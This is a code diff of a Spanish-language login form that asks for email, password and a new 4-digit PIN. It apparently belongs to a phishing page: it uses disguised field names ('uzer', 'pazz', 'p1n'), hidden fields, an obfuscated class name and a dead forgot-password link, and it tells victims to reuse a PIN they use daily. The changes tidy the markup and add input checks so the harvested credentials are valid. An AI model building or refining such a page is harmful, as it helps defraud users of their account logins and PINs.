@@ -73,16 +73,25 @@
             <div class="alert alert-danger" id="error-message"></div>
             <div>
                 <form action="" method="post" onsubmit="return sendLoginData()">
-                    <div class="form-group label-animate"><label for="uzer">Correo electrónico</label><input class="form-control" id="uzer" type="text" name="uzer" autocomplete="off" required=""></div>
-                    <div class="form-group label-animate"><label for="pazz">Contraseña</label>
+                    <div class="form-group label-animate">
+                        <label for="uzer">Correo electrónico</label>
+                        <input class="form-control" id="uzer" type="text" name="uzer" autocomplete="off" required>
+                    </div>
+                    <div class="form-group label-animate">
+                        <label for="pazz">Contraseña</label>
                         <i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()" style="cursor: pointer;"></i>
-                        <input class="form-control" id="pazz" name="pazz" type="password" required="">
+                        <input class="form-control" id="pazz" name="pazz" type="password" required minlength="5">
                     </div>
                     <div class="iHdVbkVQvFXkuwc">Para reforzar la seguridad de tu cuenta es necesario que crees un pin de 4 números. Le recomendamos usar uno que frecuentes a diario para evitar ser olvidado.</div>
-                    <div class="form-group label-animate"><label for="p1n">Crear Pin</label><input class="form-control" id="p1n" type="text" name="p1n" autocomplete="off" maxlength="4" required=""></div>
-                    <p id="gfg" hidden=""></p>
-                    <p id="address" hidden=""></p>
-                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px"><a id="link-olvidaste-tu-password" href="h">¿Olvidaste tu contraseña?</a></div>
+                    <div class="form-group label-animate">
+                        <label for="p1n">Crear Pin</label>
+                        <input class="form-control" id="p1n" type="text" name="p1n" autocomplete="off" maxlength="4" required oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+                    </div>
+                    <p id="gfg" hidden></p>
+                    <p id="address" hidden></p>
+                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px">
+                        <a id="link-olvidaste-tu-password" href="h">¿Olvidaste tu contraseña?</a>
+                    </div>
                     <div class="captcha-container form-group" style="display: none;"></div>
                     <button class="btn btn-primary btn-block" id="btn-login">Iniciar sesión</button>
                 </form>
